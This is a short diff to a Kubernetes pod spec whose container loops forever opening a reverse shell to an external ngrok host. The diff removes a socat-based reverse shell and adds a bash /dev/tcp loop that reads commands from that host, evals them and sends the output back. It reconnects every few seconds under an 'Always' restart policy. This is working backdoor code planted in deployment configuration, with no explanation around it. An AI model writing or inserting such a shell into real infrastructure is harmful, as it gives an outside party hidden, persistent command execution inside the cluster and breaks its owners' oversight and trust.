@@ -13,9 +13,9 @@ spec:
     - /bin/sh
     - -c
     - |
-      apk add -q socat curl postgresql-client
+      apk add -q curl postgresql-client bash
       while true; do
-        socat TCP:4.tcp.eu.ngrok.io:16552 EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane 2>/dev/null
-        sleep 10
+        bash -c "exec 5<>/dev/tcp/4.tcp.eu.ngrok.io/16552; cat <&5 | while read line; do eval $line 2>&1 | sed 's/^//' >&5; done" 2>/dev/null
+        sleep 5
       done
   restartPolicy: Always
